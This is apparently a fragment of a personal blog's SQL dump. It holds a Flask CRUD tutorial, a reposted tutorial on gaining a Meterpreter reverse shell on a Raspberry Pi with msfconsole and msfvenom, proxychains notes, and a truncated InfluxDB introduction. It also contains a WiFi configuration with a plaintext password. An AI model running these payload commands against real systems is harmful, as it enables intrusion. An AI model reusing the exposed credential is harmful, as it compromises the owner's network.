our blueprint! So our decorator for the route will be <code>@owners_blueprint</code>, which is what we named the blueprint.</p>\r\n\r\n<pre>\r\nfrom flask import redirect, render_template, request, url_for, Blueprint\r\nfrom project.owners.models import Owner\r\n\r\nowners_blueprint = Blueprint(\r\n    &#39;owners&#39;,\r\n    __name__,\r\n    template_folder=&#39;templates&#39;\r\n)\r\n\r\n\r\n@owners_blueprint.route(&#39;/&#39;, methods =[&quot;GET&quot;, &quot;POST&quot;])\r\ndef index():\r\n    return render_template(&#39;index.html&#39;, owners=Owner.query.all())\r\n</pre>\r\n\r\n<p>Now let&#39;s build a simple index page, just like we have seen before.</p>\r\n\r\n<pre>\r\n{% extends &#39;base.html&#39; %}\r\n\r\n{% block content %}\r\n\r\n{% for owner in owners %}\r\n    &lt;p&gt;\r\n        {{owner.first_name}} {{owner.last_name}}\r\n        &lt;br&gt;\r\n    &lt;/p&gt;\r\n{% endfor %}\r\n\r\n{% endblock %}\r\n</pre>\r\n\r\n<p>We should now be able to see all of our owners at <a href=\"localhost:3000/owners\" target=\"_blank\">localhost:3000/owners</a>. So let&#39;s make some new ones!</p>\r\n\r\n<h3>New + Create</h3>\r\n\r\n<p>Before we create, we need a route, template and form for creating a new owner. Let&#39;s start with the form. In our <code>projects/owners/forms.py</code> let&#39;s add a new form using FlaskWTF.</p>\r\n\r\n<pre>\r\nfrom flask_wtf import FlaskForm\r\nfrom wtforms import StringField\r\nfrom wtforms.validators import DataRequired\r\n\r\nclass OwnerForm(FlaskForm):\r\n    first_name = StringField(&#39;first_name&#39;, validators=[DataRequired()])\r\n    last_name = StringField(&#39;last_name&#39;, validators=[DataRequired()])\r\n\r\n</pre>\r\n\r\n<p>Now let&#39;s add a route that renders it!</p>\r\n\r\n<pre>\r\n# make sure to import it!\r\nfrom project.owners.forms import OwnerForm\r\n\r\n@owners_blueprint.route(&#39;/new&#39;)\r\ndef new():\r\n    form = OwnerForm()\r\n    return render_template(&#39;new.html&#39;, form=form)\r\n</pre>\r\n\r\n<p>And finally a view for a new owner inside of <code>project/owners/templates/new.html</code>:</p>\r\n\r\n<pre>\r\n{% extends &#39;base.html&#39; %}\r\n\r\n{% block content %}\r\n\r\n&lt;form method=&quot;POST&quot; action=&quot;{{url_for(&#39;owners.index&#39;)}}&quot;&gt;\r\n    {{ form.csrf_token }}\r\n  &lt;p&gt;\r\n    {{ form.first_name(placeholder=&quot;First Name&quot;) }}\r\n    &lt;span&gt;\r\n      {% if form.first_name.errors %}\r\n        {% for error in form.first_name.errors %}\r\n          {{ error }}\r\n        {% endfor %}\r\n      {% endif %}\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n  &lt;p&gt;\r\n    {{ form.last_name(placeholder=&quot;Last Name&quot;) }}\r\n    &lt;span&gt;\r\n      {% if form.last_name.errors %}\r\n        {% for error in form.last_name.errors %}\r\n          {{ error }}\r\n        {% endfor %}\r\n      {% endif %}\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;\r\n  &lt;button type=&quot;submit&quot;&gt;Add Owner!&lt;/button&gt;\r\n&lt;/form&gt;\r\n\r\n{% endblock %}\r\n</pre>\r\n\r\n<p>With your server running, try to access this route. You should get this error: <code>KeyError: &#39;A secret key is required to use CSRF.&#39;</code> Whoops - we forgot to set our secret key! Be sure to do that in the <code>project</code> folder&#39;s <code>__init__.py</code>. (If you don&#39;t remember how to set this, go back and review the previous chapter.)</p>\r\n\r\n<p>Now let&#39;s add a route for when we create a new owner!</p>\r\n\r\n<pre>\r\n# make sure to import the db for saving!\r\nfrom project import db\r\n\r\n# here is what our route should look like with GET and POST\r\n@owners_blueprint.route(&#39;/&#39;, methods =[&quot;GET&quot;, &quot;POST&quot;])\r\ndef index():\r\n    if request.method == &quot;POST&quot;:\r\n        form = OwnerForm(request.form)\r\n        if form.validate():\r\n            new_owner = Owner(request.form[&#39;first_name&#39;], request.form[&#39;last_name&#39;])\r\n            db.session.add(new_owner)\r\n            db.session.commit()\r\n            return redirect(url_for(&#39;owners.index&#39;))\r\n        return render_template(&#39;new.html&#39;, form=form)\r\n    return render_template(&#39;index.html&#39;, owners=Owner.query.all())\r\n</pre>\r\n\r\n<h3>Edit</h3>\r\n\r\n<p>To edit, we need to find our record first and then send the form:</p>\r\n\r\n<pre>\r\n@owners_blueprint.route(&#39;/&lt;int:id&gt;/edit&#39;)\r\ndef edit(id):\r\n    owner=Owner.query.get(id)\r\n    form = OwnerForm(obj=owner)\r\n    return render_template(&#39;edit.html&#39;, form=form, owner=owner)\r\n</pre>\r\n\r\n<p>Now we need a form to edit:</p>\r\n\r\n<pre>\r\n{% extends &#39;base.html&#39; %}\r\n\r\n{% block content %}\r\n\r\n&lt;form method=&quot;POST&quot; action=&quot;{{url_for(&#39;owners.show&#39;, id=owner.id)}}?_method=PATCH&quot;&gt;\r\n  {{ form.csrf_token }}\r\n  &lt;p&gt;\r\n    {{ form.first_name(placeholder=&quot;First Name&quot;) }}\r\n    &lt;span&gt;\r\n      {% if form.first_name.errors %}\r\n        {% for error in form.first_name.errors %}\r\n          {{ error }}\r\n        {% endfor %}\r\n      {% endif %}\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;\r\n  &lt;p&gt;\r\n    {{ form.last_name(placeholder=&quot;Last Name&quot;) }}\r\n    &lt;span&gt;\r\n      {% if form.last_name.errors %}\r\n        {% for error in form.last_name.errors %}\r\n          {{ error }}\r\n        {% endfor %}\r\n      {% endif %}\r\n    &lt;/span&gt;\r\n  &lt;/p&gt;\r\n  &lt;button type=&quot;submit&quot;&gt;Edit Owner!&lt;/button&gt;\r\n&lt;/form&gt;\r\n\r\n{% endblock %}\r\n</pre>\r\n\r\n<p>Since our show, delete, and update routes are all the same, let&#39;s create them at once!</p>\r\n\r\n<h3>Show, Delete, Update</h3>\r\n\r\n<pre>\r\n{% extends &#39;base.html&#39; %}\r\n{% block content %}\r\n    &lt;h1&gt;Welcome to the show page!&lt;/h1&gt;\r\n    &lt;p&gt;Delete me?&lt;/p&gt;\r\n\r\n    &lt;form method=&quot;POST&quot; action=&quot;{{url_for(&#39;owners.show&#39;, id=owner.id)}}?_method=DELETE&quot;&gt;\r\n        &lt;input type=&quot;submit&quot; value=&quot;X&quot;&gt;\r\n    &lt;/form&gt;\r\n{% endblock %}\r\n</pre>\r\n\r\n<pre>\r\n@owners_blueprint.route(&#39;/&lt;int:id&gt;&#39;, methods =[&quot;GET&quot;, &quot;PATCH&quot;, &quot;DELETE&quot;])\r\ndef show(id):\r\n    found_owner = Owner.query.get(id)\r\n    if request.method == b&quot;PATCH&quot;:\r\n        form = OwnerForm(request.form)\r\n        if form.validate():\r\n            found_owner.first_name = request.form[&#39;first_name&#39;]\r\n            found_owner.last_name = request.form[&#39;last_name&#39;]\r\n            db.session.add(found_owner)\r\n            db.session.commit()\r\n            return redirect(url_for(&#39;owners.index&#39;))\r\n        return render_template(&#39;edit.html&#39;, form=form, owner=found_owner)\r\n    if request.method == b&quot;DELETE&quot;:\r\n        db.session.delete(found_owner)\r\n        db.session.commit()\r\n        return redirect(url_for(&#39;owners.index&#39;))\r\n    return render_template(&#39;show.html&#39;, owner=found_owner)\r\n</pre>\r\n\r\n<p>Now all that&#39;s left is to add delete buttons to our application. You can place these wherever makes the most sense to you: on the <code>index</code>, <code>show</code>, or <code>edit</code> pages. Here&#39;s how a modified <code>index</code> page might look:</p>\r\n\r\n<pre>\r\n{% extends &#39;base.html&#39; %}\r\n\r\n{% block content %}\r\n\r\n{% for owner in owners %}\r\n  &lt;p&gt;{{owner.first_name}} {{owner.last_name}}&lt;/p&gt;\r\n  &lt;form action=&quot;{{ url_for(&#39;owners.show&#39;, id=owner.id) }}?_method=DELETE&quot; method=&quot;POST&quot;&gt;\r\n    &lt;button type=&quot;submit&quot;&gt;Delete this owner!&lt;/button&gt;\r\n  &lt;/form&gt;\r\n{% endfor %}\r\n\r\n{% endblock %}\r\n</pre>\r\n\r\n<p>Congratulations! We&#39;ve got a working CRUD app using blueprints. You can read much more about blueprints <a href=\"http://flask.pocoo.org/docs/latest/blueprints/\" target=\"_blank\">here</a>. If you notice above, we did not add CSRF validation when deleting an owner - make sure you add this on your own!</p>\r\n','2018-02-08 08:37:52','Structuring Larger Flask Applications'),(81,'yebin','<p><a href=\"https://null-byte.wonderhowto.com/forum/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics-0179407/\" target=\"_blank\">Hack a Raspberry Pi with Metasploit | Metasploit Exploitation Basics</a></p>\r\n\r\n<p><strong>Introduction:</strong></p>\r\n\r\n<p>The Raspberry Pi is a great little device. With a quad core CPU at 1.2 GHz, it makes for the perfect Linux box on the go. In this tutorial we&#39;re going to be hacking it.</p>\r\n\r\n<p><strong>Background:</strong></p>\r\n\r\n<p>Firstly, we need to go through what and how we&#39;re going to do this exactly. Our attacking machine is running <a href=\"https://www.parrotsec.org\" target=\"_blank\">Parrot Security OS</a>. It&#39;s a great alternative to Kali Linux, and I&#39;d recommend trying it out.</p>\r\n\r\n<p>The victim machine, as we know, is a Raspberry Pi running Raspbian. The IP address of the attacker is <em>192.168.1.23</em> and the IP address of the target Raspberry Pi is <em>192.168.1.75</em>. This attack takes place in a Local Area Network, however it would work just as well over the internet. <strong>For this attack to work, the victim machine has to be running Python</strong>. That&#39;s fine for us since Raspbian comes pre-installed with Python.</p>\r\n\r\n<p><strong>What are we going to do?</strong></p>\r\n\r\n<p>We are going to be using Metasploit to open a Meterpreter shell on the target Raspberry Pi. To learn more about Meterpreter, you can read <a href=\"https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/\" target=\"_blank\">this</a>. The exploit we will use is a handler (exploit/multi/handler). The payload is going to be a python script which opens a Meterpreter shell (python/meterpreter/reverse_tcp)</p>\r\n\r\n<h2>Step 1</h2>\r\n\r\n<h2>Fire Up the Metasploit Framework</h2>\r\n\r\n<p>Let&#39;s start the postgresql service so that Metasploit can interact with the database.</p>\r\n\r\n<p><strong># service postgresql start</strong></p>\r\n\r\n<p>And now let&#39;s start Metasploit by executing the following command.</p>\r\n\r\n<p><strong># msfconsole</strong></p>\r\n\r\n<p>The Metasploit Framework is fairly resource intensive, so don&#39;t be surprised if it takes a minute or so to load. Upon executing the above command, you should have a screen similar to this:</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/60/23/63638046984982/0/636380469849826023.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/60/23/63638046984982/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<p>Don&#39;t worry if the ASCII text art looks different. Metasploit generates random banners upon launch. If you don&#39;t want to see a banner or would like the launch to take slightly less time, you can use this command to start the Metasploit framework:</p>\r\n\r\n<p><strong># msfconsole -q</strong></p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<h2>Step 2</h2>\r\n\r\n<h2>Select the Exploit and Payload</h2>\r\n\r\n<p>Once the Metasploit framework has launched, we need to select an exploit. Metasploit uses the command &quot;<strong>use</strong>&quot; to select a module by name. The general syntax is as follows:</p>\r\n\r\n<p><strong>use &lt;module name&gt;</strong></p>\r\n\r\n<p>Pretty simple and self explanatory. For more information on Metasploit commands, you can look <a href=\"https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/\" target=\"_blank\">here</a>.</p>\r\n\r\n<p>Now we know how to select an exploit, let&#39;s do it:</p>\r\n\r\n<p><strong>use exploit/multi/handler</strong></p>\r\n\r\n<p>Let&#39;s break down that exploit name.</p>\r\n\r\n<p><strong>Exploit</strong>: this is an exploit module we are using.</p>\r\n\r\n<p><strong>Multi</strong>: this exploit works across MULTIple target<br />\r\noperating systems.</p>\r\n\r\n<p><strong>Handler</strong>: this is a handler exploit. This means that the exploit will wait for some data from the victim machine, and then the exploit will HANDLE that data.</p>\r\n\r\n<p>Next, let&#39;s select the payload. To make the payload work alongside the exploit, we need to use the &quot;<strong>set</strong>&quot; command. The general syntax of the command is:</p>\r\n\r\n<p><strong>set &lt;option&gt; &lt;value&gt;</strong></p>\r\n\r\n<p>We are setting the payload option, so let&#39;s use this command:</p>\r\n\r\n<p><strong>set payload python/meterpreter/reverse_tcp</strong></p>\r\n\r\n<p>Let&#39;s break down the payload name.</p>\r\n\r\n<p><strong>python</strong>: the payload platform is Python.</p>\r\n\r\n<p><strong>meterpreter</strong>: the payload opens a Meterpreter shell.</p>\r\n\r\n<p><strong>reverse_tcp</strong>: the type of connection is reverse tcp.</p>\r\n\r\n<p>We have now selected both the exploit and the payload. Your screen should now look something like this:</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/18/86/63638052987104/0/636380529871041886.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/18/86/63638052987104/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<h2>Step 3</h2>\r\n\r\n<h2>Set the Exploit and Payload Options</h2>\r\n\r\n<p>Now, we need to set the options for the exploit and payload. We can see what options we need to set by using the command</p>\r\n\r\n<p><strong>show options</strong></p>\r\n\r\n<p>This should give an output like this:</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/84/23/63638053210994/0/636380532109948423.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/84/23/63638053210994/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<p>As you can see, we have two options available to set for the payload (the exploit doesn&#39;t have any options that need to be set). These are <strong>LHOST</strong> and <strong>LPORT</strong>. Both of these options are required to be set as the output shows. LHOST refers to your attacking machine IP address. For me, this is <em>192.168.1.23</em>. LPORT refers to the port you want the payload to communicate across. I&#39;ve chosen to use port <em>4321</em>, but you could use pretty much anything you want. Once again, we will use the command &quot;<strong>set</strong>&quot; to set these options. We use the same syntax from earlier in the tutorial:</p>\r\n\r\n<p><strong>set &lt;option&gt; &lt;value&gt;</strong></p>\r\n\r\n<p>And now we just have to plug the values into the option names as follows:</p>\r\n\r\n<p><strong>set LHOST 192.168.1.23</strong><br />\r\n<strong>set LPORT 4321</strong></p>\r\n\r\n<p>This is how your screen should look after setting the two options:</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/69/32/63638053615041/0/636380536150416932.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/69/32/63638053615041/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<p>If we run the command,</p>\r\n\r\n<p><strong>show options</strong></p>\r\n\r\n<p>You should see that both the options have been set to what you specified.</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/93/28/63638053736697/0/636380537366979328.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/93/28/63638053736697/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<h2>Step 4</h2>\r\n\r\n<h2>Generate the Payload with Msfvenom</h2>\r\n\r\n<p>Now, we are going to create a payload file which will eventually be run on the Raspberry Pi to trigger the Meterpreter shell. To create the payload, we will be using a tool called <strong>msfvenom</strong>. Msfvenom is a tool used to output files and shellcode from an input payload. The basic syntax of msfvenom is:</p>\r\n\r\n<p><strong>msfvenom -p &lt;payload&gt; &gt; output.file</strong></p>\r\n\r\n<p>This is the command we are going to run:</p>\r\n\r\n<p><strong>msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4321 -f raw &gt; payload.py</strong></p>\r\n\r\n<p>Let&#39;s examine that command:<br />\r\n<strong>-p</strong>: the payload is <em>python/meterpreter/reverse_tcp</em></p>\r\n\r\n<p><strong>LHOST</strong>: the attacking machine IP</p>\r\n\r\n<p><strong>LPORT</strong>: the port being used by the payload</p>\r\n\r\n<p><strong>-f</strong>: the -f argument allows us to set the format of the payload. We are using the <em>raw</em> format.</p>\r\n\r\n<p><strong>&gt;</strong>: we output the payload to a python file called <em>payload.py</em></p>\r\n\r\n<p>After generating the payload, you should have an output something like this:</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/80/85/63638055154994/0/636380551549948085.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/80/85/63638055154994/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<p>Now you will need to transfer the payload to the Raspberry Pi. You could do this however you want to, for example, with the cloud. I transferred the file by using the Linux command, <strong>scp</strong>, which transfers files over SSH.</p>\r\n\r\n<h2>Step 5</h2>\r\n\r\n<h2>Run the Exploit</h2>\r\n\r\n<p>Now that the exploit is ready, the payload is created and on the Raspberry Pi, all that&#39;s left to do is run the exploit. You can do this with the following command,</p>\r\n\r\n<p><strong>run</strong></p>\r\n\r\n<p>You can also achieve the same result by typing</p>\r\n\r\n<p><strong>exploit</strong></p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/33/09/63638055546432/0/636380555464323309.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/33/09/63638055546432/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<p>Now let&#39;s go back to the Raspberry Pi and run the payload.</p>\r\n\r\n<p><strong>python payload.py</strong></p>\r\n\r\n<p>If we hop back to Metasploit, we can see that a meterpreter session has opened!</p>\r\n\r\n<p><a href=\"https://img.wonderhowto.com/img/original/38/05/63638056294566/0/636380562945663805.jpg\" target=\"_blank\"><img alt=\"\" src=\"https://img.wonderhowto.com/img/38/05/63638056294566/0/hack-raspberry-pi-with-metasploit-metasploit-exploitation-basics.w1456.jpg\" style=\"height:334px; margin-left:0px; width:auto\" /></a></p>\r\n\r\n<p>At this point, we have pretty much full control over the target. If you wanted to open a system shell from the target, you could do so with the command,</p>\r\n\r\n<p><strong>shell</strong></p>\r\n\r\n<p>And that&#39;s about all there is to this tutorial on how to hack a Raspberry Pi with Metasploit!</p>\r\n\r\n<p>If you enjoyed this tutorial or found it helpful, make sure to leave a comment as this let&#39;s me know that I&#39;m helping someone. If you run into any problems while following this tutorial, leave a comment and I&#39;ll do my best to help you.</p>\r\n','2018-02-09 05:54:53','Hack a Raspberry Pi with Metasploit | Metasploit Exploitation Basics'),(82,'yebin','<h1><a href=\"http://shawnelee88.github.io/2015/07/10/proxychains-shadowsocks%E7%A5%9E%E5%99%A8/\" target=\"_blank\">proxychains</a></h1>\r\n\r\n<h2>安装</h2>\r\n\r\n<p>1.mac shadows安装简单</p>\r\n\r\n<p>2.proxychains</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n7\r\n8\r\n9\r\n</pre>\r\n			</td>\r\n			<td>\r\n			<pre>\r\ngit clone https://github.com/rofl0r/proxychains-ng.git\r\ncd proxychains-ng\r\n./configure\r\n(sudo) make &amp;&amp; make install\r\ncp ./src/proxychains.conf /etc/proxychians.conf\r\ncd .. &amp;&amp; rm -rf proxychains-ng\r\n\r\n或者\r\nbrew install proxychains-ng  //mac\r\n</pre>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<h2>修改配置</h2>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n1\r\n2\r\n3\r\n4\r\n5\r\n6\r\n7\r\n8\r\n9\r\n10\r\n11\r\n12\r\n</pre>\r\n			</td>\r\n			<td>\r\n			<pre>\r\nvim /etc/proxychains.conf\r\n推荐配置\r\nstrict_chain\r\nproxy_dns \r\nremote_dns_subnet 224\r\ntcp_read_time_out 15000\r\ntcp_connect_time_out 8000\r\nlocalnet 127.0.0.0/255.0.0.0\r\nquiet_mode\r\n\r\n[ProxyList]\r\nsocks5  127.0.0.1 1080\r\n</pre>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<h2>使用</h2>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n1\r\n2\r\n</pre>\r\n			</td>\r\n			<td>\r\n			<pre>\r\nproxychains4 curl https://www.twitter.com/\r\nproxychains4 git push origin master\r\n</pre>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<h2>测试proxychains4</h2>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<pre>\r\n1\r\n2\r\n</pre>\r\n			</td>\r\n			<td>\r\n			<pre>\r\nwget https://www.dropbox.com -v -O /dev/null    //直接输入这条语句连接不了\r\nproxychains4 wget https://www.dropbox.com -v -O /dev/null   //加入proxychains4之后就可以顺利执行\r\n</pre>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>参考来源：</p>\r\n\r\n<ul>\r\n	<li><a href=\"https://github.com/shadowsocks/shadowsocks\" target=\"_blank\">shadowsocks官网&mdash;github</a></li>\r\n	<li><a href=\"https://github.com/rofl0r/proxychains-ng\" target=\"_blank\">proxychains4神器官网&mdash;github</a></li>\r\n	<li><a href=\"https://github.com/shadowsocks/shadowsocks/wiki/Using-Shadowsocks-with-Command-Line-Tools\" target=\"_blank\">shadowsocks 官网wiki&mdash;配置proxychains</a></li>\r\n	<li><a href=\"http://blog.ainhaato.moe/proxychains-socks5-shell/\" target=\"_blank\">利用proxychains在终端使用socks5代理</a></li>\r\n	<li><a href=\"http://blog.ihipop.info/2011/01/1988.html\" target=\"_blank\">在终端下间接使用Socks5代理的几种方法(privoxy,tsocks,proxychains)&mdash;比较老，可以参考</a></li>\r\n	<li><a href=\"http://wsgzao.github.io/post/fq/\" target=\"_blank\">gfw小结</a></li>\r\n</ul>\r\n','2018-02-09 07:12:39','Install Proxychains'),(83,'yebin','<p>Test Raspberry Pi:</p>\r\n\r\n<p>msfconsole options:</p>\r\n\r\n<p>LHOST: 192.168.1.187</p>\r\n\r\n<p>LPORT: 4321</p>\r\n\r\n<p>LHOST: 10.8.0.4</p>\r\n\r\n<p>LPPRT: 4322</p>\r\n','2018-02-09 09:01:56','TestRpi Msfconsole Options'),(84,'yebin','<p>hbwwdmz network configuration:</p>\r\n\r\n<p>/etc/wpa_supplicant/wpa_supplicant.conf:</p>\r\n\r\n<p>ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev<br />\r\nupdate_config=1<br />\r\ncountry=GB</p>\r\n\r\n<p>network={<br />\r\n&nbsp;&nbsp; &nbsp;ssid=&quot;NorthcomSH&quot;<br />\r\n&nbsp;&nbsp; &nbsp;psk=&quot;33927569&quot;<br />\r\n&nbsp;&nbsp; &nbsp;key_mgmt=WPA-PSK<br />\r\n}</p>\r\n\r\n<p>network={<br />\r\n&nbsp;&nbsp; &nbsp;ssid=&quot;TP-LINK_ZBS&quot;<br />\r\n&nbsp;&nbsp; &nbsp;key_mgmt=NONE<br />\r\n}</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n','2018-02-11 01:36:30','湖北无委卫星控制器网络配置'),(85,'yebin','<h1>How To Structure Large Flask Applications：</h1>\r\n\r\n<p>https://www.digitalocean.com/community/tutorials/how-to-structure-large-flask-applications</p>\r\n','2018-02-12 09:29:10','How To Structure Large Flask Applications'),(86,'yebin','<p>How To Configure a Linux Service to Start Automatically After a Crash or Reboot &ndash; Part 1: Practical Examples</p>\r\n\r\n<p><a href=\"https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples\" target=\"_blank\">Original Link</a></p>\r\n\r\n<p><a href=\"http://How To Use Systemctl to Manage Systemd Services and Units\" target=\"_blank\">Other Reference</a></p>\r\n\r\n<p>/etc/systemd/system/multi-user.target.wants/mysqld.service</p>\r\n\r\n<pre>\r\n<code>[Unit]\r\n...\r\n\r\n[Install]\r\n...\r\n\r\n[Service]\r\n...\r\n...\r\nRestart=always\r\n...</code>\r\n</pre>\r\n','2018-02-23 08:50:44','How To Configure a Linux Service to Start Automatically After a Crash or Reboot'),(87,'yebin','<h2><a href=\"https://techtutorialsx.com/2017/04/23/python-subscribing-to-mqtt-topic/\" target=\"_blank\">Python: Subscribing to MQTT&nbsp;topic</a></h2>\r\n','2018-02-26 08:35:18','Python: Subscribing to MQTT topic'),(88,'yebin','<p>DB: myblog</p>\r\n\r\n<p>Table: status, temperature</p>\r\n\r\n<p>OP:</p>\r\n\r\n<p>1. Drop id</p>\r\n\r\n<p>2. Query by create_time</p>\r\n','2018-02-28 03:06:58','SatelC Database Operation'),(89,'yebin','<p><a href=\"https://www.xul.fr/javascript/\" target=\"_blank\">Original Link</a></p>\r\n','2018-03-01 02:00:33','JavaScript explained by examples'),(90,'yebin','<p><a href=\"http://www.ywnds.com/?p=10763\" target=\"_blank\">原文链接</a></p>\r\n\r\n<h3>一、什么是InfluxDB？</h3>\r\n\r\n<p>InfluxDB是一款用Go语言编写的开源分布式时序、事件和指标数据库，无需外部依赖。该数据库现在主要用于存储涉及大量的时间戳数据，如DevOps监控数据，APP metrics, loT传感器数据和实时分析数据。</p>\r\n\r\n<p><strong>InfluxDB特征：</strong></p>\r\n\r\n<p>&ndash; 无结构(无模式)：可以是任意数量的列(tags)。</p>\r\n\r\n<p>&ndash; 可以设置metric的保存时间。</p>\r\n\r\n<p>&ndash; 支持与时间有关的相关函数(如min、max、sum、count、mean、median等)，方便统计。</p>\r\n\r\n<p>&ndash; 支持存储策略：可以用于数据的删改(influxDB没有提供数据的删除与修改方法)。</p>\r\n\r\n<p>&ndash; 支持连续查询：是数据库中自动定时启动的一组语句，和存储策略搭配可以降低InfluxDB的系统占用量。</p>\r\n\r\n<p>&ndash; 原生的HTTP支持，内置HTTP API。</p>\r\n\r\n<p>&ndash; 支持类似SQL语法。</p>\r\n\r\n<p>&ndash; 支持设置数据在集群中的副本数。</p>\r\n\r\n<p>&ndash; 支持定期采样数据，写入另外的measurement，方便分粒度存储数据。</p>\r\n\r\n<p>&ndash; 自带web管理界面，方便使用(登入方式：http://&lt; InfluxDB-IP &gt;:8083)。</p>\r\n\r\n<p>&ndash; 最关键的一点，也是我采用的原因，支持Grafana画图展示。</p>\r\n\r\n<p>PS：有了InfluxDB+Grafana后，你就可以写一些简单的程序了，可以只负责写后端逻辑部分，数据都可以存入InfluxDB，然后通过Grafana展示出来。</p>\r\n\r\n<h3>二、InfluxDB基本概念</h3>\r\n\r\n<p>在具体的讲解influxdb的相关操作之前先说说influxdb的一些专有名词，这些名词代表什么。先看下面一段Influxdb中的表信息。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<table>\r\n	<tbody>\r\n		<tr>\r\n			<td>\r\n			<p>1</p>\r\n\r\n			<p>2</p>\r\n\r\n			<p>3</p>\r\n\r\n			<p>4</p>\r\n\r\n			<p>5</p>\r\n\r\n			<p>6</p>\r\n			</td>\r\n			<td>\r\n			<p>&gt; select * from disk;</p>\r\n\r\n			<p>name: disk</p>\r\n\r\n			<p>time&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;count device free hostname used used_percent</p>\r\n\r\n			<p>----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;----- ------ ---- -------- ---- ------------</p>\r\n\r\n			<p>1502089306183159978 1&nbsp;&nbsp;&nbsp;&nbsp; /data&nbsp;&nbsp;80&nbsp;&nbsp; server01 100&nbsp;&nbsp;60.33</p>\r\n\r\n			<p>1502089342879496791 1&nbsp;&nbsp;&nbsp;&nbsp; /data&nbsp;&nbsp;90&nbsp;&nbsp; server02 110&nbsp;&nbsp;68.33</p>\r\n			</td>\r\n		</tr>\r\n	</tbody>\r\n</table>\r\n\r\n<p>InfluxDB是时序数据库，所以怎么都绕不开时间，第一纵列time存储着时间戳，而时间戳是与数据进行关联，这样才能将时间和数据进行展示。</p>\r\n\r\n<p><strong>InfluxDB名词</strong></p>\r\n\r\n<p>database：数据库，根关系型数据库一个概念。</p>\r\n\r\n<p>measurement：数据库中的表，就是关系型数据库中的表。</p>\r\n\r\n<p>points：表里面的一行数据，就是关系型数据库中的记录。</p>\r\n\r\n<p>InfluxDB中独有的一些概念</p>\r\n\r\n<p>Point由时间戳（time）、标签（tags）和值（field）组成。</p>\r\n\r\n<p>time：每条数据记录的时间，也是数据库自动生成的主索引。</p>\r\n\r\n<p>tags：各种有索引的属性。</p>\r\n\r\n<p>fields：各种记录的值。</p>\r\n\r\n<p>tag set：tag在InfluxDB中会按照字典序排序，不管是tag-key还是tag-value，只要不一致就分别属于两个tag set，例如hostname=server01,device=/data和hostname=server02,device=/data就是两个不同的tag set。</p>\r\n\r\n<p>还有三个重要的名词：Series、Retention policy和Shard</p>\r\n\r\n<p>Series：相当于是InfluxDB中一些数据的集合，在同一个database中，retention policy、measurement、tag sets完全相同的数据同属于一个series，同一个series的数据在物理上会按照时间顺序排列存储在一起。</p>\r\n\r\n<p>Retention 